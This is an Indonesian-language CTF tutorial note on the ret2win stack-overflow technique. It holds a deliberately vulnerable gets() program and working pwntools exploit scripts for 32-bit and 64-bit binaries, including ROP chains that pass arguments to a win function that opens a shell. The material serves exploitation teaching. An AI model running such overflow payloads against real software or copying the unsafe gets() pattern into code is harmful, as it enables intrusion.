#cybersecurity

Ret2win adalah teknik paling dasar: **melompat ke fungsi `win` (atau `flag`, `shell`, `admin`) yang sudah ada di binary**. Fungsi ini biasanya langsung membaca flag atau membuka shell.

## Skenario

```c
void win() {
    system("cat flag.txt");   // atau system("/bin/sh")
}

void vuln() {
    char buf[64];
    gets(buf);
}
```

- NX on/off tidak masalah (kita lompat ke fungsi, bukan eksekusi stack)
- Tanpa canary (atau canary di-leak)
- Tanpa PIE → alamat win tetap

## Langkah

```bash
# 1. Cek proteksi
checksec --file=chall
# NX enabled, Canary disabled, PIE disabled  <- ideal ret2win

# 2. Cari alamat win
$ python3 -c "from pwn import *; print(hex(ELF('./chall').sym.win))"
0x401236
```

## Exploit

```python
from pwn import *

context.binary = elf = ELF("./chall")
io = process("./chall")
# io = remote("host.ctf", 1337)

offset = 72  # dari cyclic_find

payload = b"A" * offset + p64(elf.sym.win)

io.sendlineafter(b": ", payload)
io.interactive()
```

## 32-bit

```python
payload = b"A" * offset + p32(elf.sym.win)   # p32 untuk 32-bit
```

## Kalau win butuh argumen

```c
void win(int a, int b) {
    if (a == 0xdeadbeef && b == 0xcafebabe) {
        system("/bin/sh");
    }
}
```

### 32-bit (argumen di stack)

```python
payload = b"A"*offset + p32(win) + b"RET" + p32(0xdeadbeef) + p32(0xcafebabe)
#                              ^return addr setelah win  ^arg1      ^arg2
```

### 64-bit (argumen di register - butuh gadget)

```python
from pwn import *

rop = ROP(elf)
rop.win(0xdeadbeef, 0xcafebabe)   # pwntools otomatis cari gadget pop rdi/rsi
payload = b"A"*offset + rop.chain()
```

## Catatan

1. Ret2win = ret2**win** - nama fungsi bisa beda (`win`, `flag`, `print_flag`, `get_flag`, `shell`). Cek dengan `elf.sym` atau `nm chall`.
2. Stripped binary → nama fungsi hilang; cari dengan `strings` (string "flag"/"sh") atau Ghidra.
3. Kalau ret2win tidak ada, lanjut ke [[Ret2shellcode]] (NX off) atau [[Ret2libc]] (NX on).
4. Di 64-bit, kalau crash aneh di `win` (misal `movaps`), tambahkan `ret` gadget sebelum win untuk alignment (lihat [[Calling Convention]]).
